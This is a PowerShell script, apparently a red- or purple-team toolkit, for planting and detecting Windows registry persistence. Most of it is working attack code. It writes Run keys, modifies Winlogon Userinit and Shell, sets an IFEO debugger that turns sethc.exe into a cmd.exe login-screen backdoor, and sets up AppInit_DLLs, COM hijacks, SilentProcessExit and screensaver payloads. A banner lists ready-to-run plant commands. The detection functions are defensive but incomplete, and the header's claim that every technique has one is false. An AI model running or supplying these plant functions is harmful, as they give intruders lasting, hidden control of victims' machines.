<#
.SYNOPSIS
    Registry-based persistence techniques — plant and detect.
.DESCRIPTION
    Implements HKCU and HKLM persistence via Run keys, Winlogon, IFEO,
    AppInit_DLLs, COM hijack, SilentProcessExit, ScreenSaver, and more.
    Each technique has a Plant and Detect function.
.NOTES
    MITRE ATT&CK: T1547.001, T1547.004, T1547.012, T1546.015, T1546.012
#>

# ─── Run / RunOnce Keys (T1547.001) ─────────────────────────────────────

function Plant-RunKey {
    param(
        [string]$Name = "WindowsUpdate",
        [string]$Command = "C:\temp\payload.exe",
        [switch]$HKLM,
        [switch]$RunOnce
    )
    $keyType = if ($RunOnce) { "RunOnce" } else { "Run" }
    $hive = if ($HKLM) { "HKLM" } else { "HKCU" }
    $path = "${hive}:\SOFTWARE\Microsoft\Windows\CurrentVersion\$keyType"
    Set-ItemProperty -Path $path -Name $Name -Value $Command -Force
    Write-Output "[+] Planted: $path\$Name = $Command"
}

function Detect-RunKeys {
    $paths = @(
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
        "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run"
    )
    foreach ($p in $paths) {
        if (Test-Path $p) {
            $vals = Get-ItemProperty $p -ErrorAction SilentlyContinue
            $vals.PSObject.Properties | Where-Object { $_.Name -notmatch '^PS' } | ForEach-Object {
                Write-Output "[*] $p\$($_.Name) = $($_.Value)"
            }
        }
    }
}

# ─── Winlogon Shell / Userinit (T1547.004) ──────────────────────────────

function Plant-Winlogon {
    param(
        [string]$Payload = "C:\temp\payload.exe",
        [ValidateSet("Shell","Userinit")]
        [string]$Method = "Userinit"
    )
    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    if ($Method -eq "Userinit") {
        $current = (Get-ItemProperty $path).Userinit
        Set-ItemProperty -Path $path -Name "Userinit" -Value "$current$Payload," -Force
        Write-Output "[+] Appended to Userinit: $Payload"
    } else {
        Set-ItemProperty -Path $path -Name "Shell" -Value "explorer.exe,$Payload" -Force
        Write-Output "[+] Modified Shell: explorer.exe,$Payload"
    }
}

function Detect-Winlogon {
    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
    $props = Get-ItemProperty $path
    Write-Output "[*] Shell    = $($props.Shell)"
    Write-Output "[*] Userinit = $($props.Userinit)"
    if ($props.Shell -ne "explorer.exe" -or $props.Userinit -notmatch '^C:\\Windows\\system32\\userinit\.exe,$') {
        Write-Output "[!] SUSPICIOUS: Non-default Winlogon values detected"
    }
}

# ─── Image File Execution Options (T1546.012) ───────────────────────────

function Plant-IFEO {
    param(
        [string]$TargetExe = "sethc.exe",
        [string]$Debugger = "cmd.exe"
    )
    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$TargetExe"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "Debugger" -Value $Debugger -Force
    Write-Output "[+] IFEO: $TargetExe -> $Debugger"
    Write-Output "[*] Trigger: Press Shift 5 times at login screen (if sethc.exe)"
}

function Detect-IFEO {
    $basePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
    Get-ChildItem $basePath -ErrorAction SilentlyContinue | ForEach-Object {
        $debugger = (Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).Debugger
        if ($debugger) {
            Write-Output "[!] IFEO Debugger: $($_.PSChildName) -> $debugger"
        }
    }
}

# ─── AppInit_DLLs (T1546.010) ───────────────────────────────────────────

function Plant-AppInitDLL {
    param([string]$DllPath = "C:\temp\payload.dll")
    $path = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
    Set-ItemProperty -Path $path -Name "AppInit_DLLs" -Value $DllPath -Force
    Set-ItemProperty -Path $path -Name "LoadAppInit_DLLs" -Value 1 -Force
    Write-Output "[+] AppInit_DLLs set to $DllPath (loads into every user32.dll process)"
}

function Detect-AppInitDLL {
    $paths = @(
        "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows",
        "HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Windows"
    )
    foreach ($p in $paths) {
        $props = Get-ItemProperty $p -ErrorAction SilentlyContinue
        if ($props.LoadAppInit_DLLs -eq 1 -and $props.AppInit_DLLs) {
            Write-Output "[!] AppInit_DLLs ACTIVE: $($props.AppInit_DLLs)"
        }
    }
}

# ─── COM Hijack (T1546.015) ─────────────────────────────────────────────

function Plant-COMHijack {
    param(
        [string]$CLSID = "{b5f8350b-0548-48b1-a6ee-88bd00b4a5e7}",
        [string]$DllPath = "C:\temp\payload.dll"
    )
    $path = "HKCU:\Software\Classes\CLSID\$CLSID\InprocServer32"
    New-Item -Path $path -Force | Out-Null
    Set-ItemProperty -Path $path -Name "(Default)" -Value $DllPath -Force
    Set-ItemProperty -Path $path -Name "ThreadingModel" -Value "Both" -Force
    Write-Output "[+] COM Hijack: CLSID $CLSID -> $DllPath"
}

# ─── SilentProcessExit (T1546.012) ──────────────────────────────────────

function Plant-SilentProcessExit {
    param(
        [string]$MonitorProcess = "notepad.exe",
        [string]$Payload = "C:\temp\payload.exe"
    )
    $ifeoPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\$MonitorProcess"
    New-Item -Path $ifeoPath -Force | Out-Null
    Set-ItemProperty -Path $ifeoPath -Name "GlobalFlag" -Value 0x200 -Force
    $spePath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\$MonitorProcess"
    New-Item -Path $spePath -Force | Out-Null
    Set-ItemProperty -Path $spePath -Name "ReportingMode" -Value 1 -Force
    Set-ItemProperty -Path $spePath -Name "MonitorProcess" -Value $Payload -Force
    Write-Output "[+] SilentProcessExit: When $MonitorProcess exits -> $Payload runs"
}

# ─── ScreenSaver Persistence ────────────────────────────────────────────

function Plant-ScreenSaver {
    param(
        [string]$Payload = "C:\temp\payload.scr",
        [int]$Timeout = 60
    )
    $path = "HKCU:\Control Panel\Desktop"
    Set-ItemProperty -Path $path -Name "SCRNSAVE.EXE" -Value $Payload -Force
    Set-ItemProperty -Path $path -Name "ScreenSaveActive" -Value "1" -Force
    Set-ItemProperty -Path $path -Name "ScreenSaveTimeOut" -Value $Timeout -Force
    Write-Output "[+] ScreenSaver persistence: $Payload (triggers after ${Timeout}s idle)"
}

function Detect-ScreenSaver {
    $path = "HKCU:\Control Panel\Desktop"
    $scr = (Get-ItemProperty $path -ErrorAction SilentlyContinue).'SCRNSAVE.EXE'
    if ($scr -and $scr -notmatch '\.scr$') {
        Write-Output "[!] Suspicious screensaver: $scr"
    } elseif ($scr) {
        Write-Output "[*] ScreenSaver: $scr"
    }
}

# ─── Detect All ─────────────────────────────────────────────────────────

function Detect-AllRegistryPersistence {
    Write-Output "`n=== Run Keys ==="; Detect-RunKeys
    Write-Output "`n=== Winlogon ==="; Detect-Winlogon
    Write-Output "`n=== IFEO ==="; Detect-IFEO
    Write-Output "`n=== AppInit_DLLs ==="; Detect-AppInitDLL
    Write-Output "`n=== ScreenSaver ==="; Detect-ScreenSaver
}

Write-Output @"
[*] Registry Persistence Functions Loaded. Dot-source then call:

    Plant functions:
      Plant-RunKey -Name "Update" -Command "C:\temp\payload.exe"
      Plant-RunKey -Name "Update" -Command "C:\temp\payload.exe" -HKLM
      Plant-Winlogon -Payload "C:\temp\payload.exe" -Method Userinit
      Plant-IFEO -TargetExe "sethc.exe" -Debugger "cmd.exe"
      Plant-AppInitDLL -DllPath "C:\temp\payload.dll"
      Plant-COMHijack -CLSID "{CLSID}" -DllPath "C:\temp\payload.dll"
      Plant-SilentProcessExit -MonitorProcess "notepad.exe" -Payload "C:\temp\payload.exe"
      Plant-ScreenSaver -Payload "C:\temp\payload.scr" -Timeout 60

    Detection:
      Detect-AllRegistryPersistence
"@
